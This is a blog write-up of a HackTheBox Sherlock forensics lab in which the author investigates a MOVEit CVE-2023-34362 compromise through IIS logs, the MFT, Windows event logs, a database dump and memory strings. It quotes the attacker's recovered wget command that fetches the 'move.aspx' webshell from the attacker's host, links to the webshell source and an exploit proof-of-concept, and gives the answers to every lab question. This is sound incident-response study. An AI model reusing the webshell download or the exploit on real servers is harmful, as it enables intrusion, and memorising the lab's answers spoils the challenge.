+++
title = 'HTB i-like-to Writeup'
date = 2023-12-22T00:08:38-05:00
draft = false
+++

This is a HackTheBox Sherlock challenge, which is a new type of blue-team lab that HackTheBox introduced last month. These defensive security labs simulate real attack scenarios and require you to investigate in order to answer a series of questions about the incident.

I want to preface by saying that I'm no expert on blue-team techniques, and that's why I actually wanted to do this challenge in the first place. I'm very interested in learning more about Digital Forensics and Incident Response (DFIR), and I'm using these new Sherlock labs as part of that effort.

We're given the following scenario:
>We have unfortunately been hiding under a rock and did not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker & retrieve some details so we can implement them into our SOC environment. We have provided you with a triage of all the necessary artifacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here...

## Questions

1. What is the name of the ASPX webshell uploaded by the attacker?
2. What was the attacker's IP address?
3. What user agent was used to perform the initial attack?
4. When was the ASPX webshell uploaded by the attacker?
5. The attacker uploaded an ASP webshell which didn't work, what is its filesize in bytes?
6. Which tool did the attacker use to initially enumerate the vulnerable server?
7. We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC).
8. Which protocol did the attacker utilize to remote into the compromised machine?
9. Please confirm the date and time the attacker remotely accessed the compromised machine.
10. What was the useragent that the attacker used to access the webshell?
11. What is the inst ID of the attacker?
12. What command was run by the attacker to retrieve the webshell?
13. What was the string within the title header of the webshell deployed by the TA?
14. What did the TA change our moveitsvc account password to?

## MOVEit Transfer Critical Vulnerability

Earlier this year, [CVE-2023-34362](https://nvd.nist.gov/vuln/detail/CVE-2023-34362) was published. This is a critical SQL Injection vulnerability in the MOVEit file transfer software that can give access to the database and even provide Remote Code Execution (RCE) in some scenarios. You can find a proof-of-concept for this exploit [here](https://github.com/horizon3ai/CVE-2023-34362).

## Provided Files

We're given a memory dump (vmem file), but the "client" mentions that they forget to include the vmss file, which means we probably won't be able to do memory analysis with a tool like Volatility. We are provided with a hint to go "back to basics", but we'll get to that later.

We are also given a zip file containing output from the Kroll Artifact Parser and Extractor (KAPE), a tool which collects forensic artifacts from the filesystem. Here's a list of some of the important files KAPE provided that we'll need to solve the challenge:
* `log.json` shows everything that was collected
* `requests.json` contains metadata about the collected files
* `uploads/` contains most of the files we're going to look at
	* `moveit.sql` is a dump of the database
	* `auto/` contains some important log files
		* Microsoft IIS logs (`auto/C%3A/inetpub/logs/LogFiles/W3SVC2/u_ex230712.log`)
		* Windows event logs (`auto/C%3A/Windows/System32/winevt/Logs/`)
	* `ntfs/` has some other useful files, most importantly the MFT
		* Master File Table (MFT) (`ntfs/%5C%5C.%5CC%3A/$MFT`)

## Starting the Hunt

Since the attack used SQL injection against a web server, we should start with the IIS logs.

**Note:** I'm trying to improve my Powershell skills, so I'll be using that for *most* of the command line operations in this writeup. All of these techniques can be done easily with equivalent commands in a bash shell.

![IIS logs](/images/iliketo/IIS_log.png)

We'll use Powershell to take a look at the `cs-uri-stem` column, which contains the request paths. First we use `Get-Content` to print the contents of the file, then `Foreach` with a `-split` command to get the values in the `cs-uri-stem` column. Finally, we pipe that into `Group-Object` to get a count for each unique value in the column.

![request paths](/images/iliketo/IIS_request_paths.png)
![final requests](/images/iliketo/final_requests.png)

The second picture above shows that the final few requests in the log are to `/moveit.asp` and `/move.aspx`. It's probably safe to say that these are the webshells that the attacker attempted to upload. Question #1 asks for the ASPX webshell used by the attacker, so the answer is `move.aspx`. 

We can change the command slightly to see the client-ip column.

![client IP](/images/iliketo/IIS_clientIP.png)

The IP address `10.255.254.3` seems responsible for most of the traffic here, so that is likely the attacker's IP address and the answer to #2.

Let's look at the cs(User-Agent) column to see what user agents were used, since that is related to #3.

![user agents](/images/iliketo/user_agents.png)

Hmm, the user agent "Ruby" is used quite a lot, but let's do some more digging. Using [this article](https://www.kroll.com/en/insights/publications/cyber/moveit-vulnerability-investigations-uncover-additional-exfiltration-method) as a reference, we can determine if this user agent was used for requests typically associated with this vulnerability.

![finding user agent](/images/iliketo/finding_user_agent.png)

The requests shown above are artifacts common to attacks using CVE-2023-34362, and they were made with the "Ruby" user agent, so that is our answer to #3. This also hints that the attacker may have used Metasploit to conduct the attack since Metasploit modules are written in the Ruby programming language.

#4 wants us to find the date and time that the ASPX webshell was uploaded by the attacker. We can find this easily since we already know that the webshell's name is `move.aspx`, but we won't find this information in the IIS logs. Instead, we need to look at the $MFT file. I recommend Eric Zimmerman's [MFTExplorer](https://www.sans.org/tools/mftexplorer/) tool for this. Just a warning, it takes quite a long time for this tool to load up an MFT file. You can also use Zimmerman's MFTECmd command line tool if you don't want to use a GUI, and you can find it on [this page](https://ericzimmerman.github.io/#!index.md).

After loading the MFT file into MFTExplorer, we can see a folder called `MOVEitTransfer/`.

![mftexplorer](/images/iliketo/mftexplorer.png)

Investigating the `MOVEitTransfer/wwwroot/` folder, we see the two webshells that the attacker uploaded.

![mftexplorer webshells](/images/iliketo/mftwebshells.png)

You can see from the image above that the ASPX webshell was uploaded on 2023-07-12 at 11:24:30. So, the answer to #4, in the format requested by HTB, is "12/07/2023 11:24:30".

#5 wants us to find the filesize, in bytes, of the ASP webshell that didn't work, aka the `moveit.asp` file. We can find this info in MFTExplorer

![asp size](/images/iliketo/aspsize.png)

The size is given in hexadecimal, but we can easily convert this to decimal: `0x552` &rarr; `1362` bytes.

Question #7 is next (the questions are mislabeled on the HTB page, and go straight from #5 to #7). It asks which tool the attacker used for enumeration. If you've been paying attention, you'll remember that we got a clue about this when viewing the IIS logs.

![nmap](/images/iliketo/nmap.png)

We see that an nmap user agent was used quite a lot at the beginning of the IIS logs, so "nmap" is the answer.

#8 asks us when the attacker changed the password for the service account. We can find this information in the Windows event logs. I'm going to use the Windows Event Viewer to find this, as I'm not yet very familiar other tools that can be used for this purpose, like [Chainsaw](https://github.com/WithSecureLabs/chainsaw), but the event viewer is certainly not the most efficient method. Anyways, if you're looking for the specific log file that contains this answer, it's titled `Security`. In event viewer, you can easily filter for specific event IDs, and the ID for a password change event is 4724.

![password change](/images/iliketo/passchange.png)

Since I'm viewing this in event viewer, it automatically converts the events to my timezone, so I'll need to convert that back to UTC: 7:09:27 &rarr; 11:09:27. This is the only time the `moveitsvc` account changes it's own password, and the timestamp lines up with when we know the attack took place. So, the answer to #8 is `12/07/2023 11:09:27`. 

We can use the same log file to find the answer to #9, which asks for the protocol used by the attacker to remote into the compromised machine. It's a safe bet that the attacker used the `moveitsvc` account that they changed the password for, so we'll look for log entries around that same timestamp. We can filter for login events by looking for events with the ID 4624.

![rdp](/images/iliketo/rdp.png)

We see that a user logged in to the service account just a couple of minutes after the password was changed. By referencing Microsoft's [guide](https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types) on different logon types, we see that logon type 10 is used for users logging in with the Remote Desktop Protocol (RDP). This is the answer to #9. 

Converting the time to UTC again, we also get the answer to #10, which asks when the attacker remotely accessed the machine: `12/07/2023 11:11:18`.

Going back to the IIS logs will help us find the user agent used to access the webshell, the answer to #11.

![number 11](/images/iliketo/number11.png)

The user agent is `Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0`.

To get the answer to #12, the inst ID of the attacker, we need to look at the database dump. I really tried to find a good way to do this with Powershell (I'm sure there's one out there), but after a some trial and error I decided to bite the bullet and do this in a bash shell using `grep` and `sed` since I'm more familiar with that.

First, let's check out what tables are available.

![tables](/images/iliketo/tables.png)

There are quite a few tables, but our best bet is to look at the "log" table. Let's look at the structure of the table.

![log table](/images/iliketo/logtable.png)

It looks like this table does contain the InstID value, but the insert statements are a bit of a mess. Let's make them easier to look at with `sed`, then use `grep` to get entries on the day of the attack.

![instid](/images/iliketo/instid.png)

We see several log entries using the "Ruby" user agent, which we know was used during the attack. They all have the same InstID, 1234, so that is the answer to #12.

To answer the last 3 questions, we need to finally look at the provided memory dump. Remember the hint about getting "back to basics", well we're going to do just that by looking at the file using `strings`.

![strings](/images/iliketo/strings.png)

Question #13 asks what command was run to retrieve the webshell. We know the webshell is called `move.aspx`, so we'll use `grep` to search the strings file and `sort` to filter out duplicates.

![question13](/images/iliketo/question13.png)

It looks like the attacker used `wget` to retrieve the webshell. The answer to #13 is `wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx`.

Next, we need to find the string within the title header of the deployed webshell. The output of the previous command contained some HTML, which might be related to the request for the webshell.

![html](/images/iliketo/html.png)

We can use the `grep` options `-A` and `-B` to get the lines before and after, like so

![title](/images/iliketo/title.png)

So the answer to #14 is "awen asp.net webshell". A quick google search for "awen webshell" gives [this](https://github.com/SecWiki/WebShell-2/blob/master/Aspx/awen%20asp.net%20webshell.aspx) result, so this answer makes sense.

The final question asks what the attacker changed the service account's password to. The attacker likely used the `net user` command to do this, so let's search for that.

![newpass](/images/iliketo/newpass.png)

So, the answer to the final question is "5trongP4ssw0rd".

Whew! That was a lot of learning for me, but it was a great experience to become more familiar with the DFIR process. I also learned quite a bit about Powershell, though it was nice to use the bash commands that I'm more familiar with for the last few questions.

Hope you enjoyed,

Dakota Vickers